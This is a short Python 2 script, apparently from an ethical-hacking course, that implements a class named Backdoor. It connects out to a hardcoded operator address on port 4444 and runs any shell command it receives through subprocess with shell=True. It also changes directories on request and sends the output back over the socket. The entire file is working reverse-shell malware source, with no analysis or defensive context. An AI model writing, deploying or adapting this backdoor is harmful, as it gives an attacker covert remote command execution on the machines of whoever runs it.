#!/usr/bin/env python

import socket
import subprocess
import json
import os


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)

            except ValueError:
                continue

    def change_work_dir(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        # connection.send("[+] I'am in")

        while True:
            command = self.reliable_recv()
            if command[0] == "exit":
                self.connection.close()
                exit()

            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_work_dir(command[1])

            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)


my_backdoor = Backdoor("192.168.43.16", 4444)
my_backdoor.run()





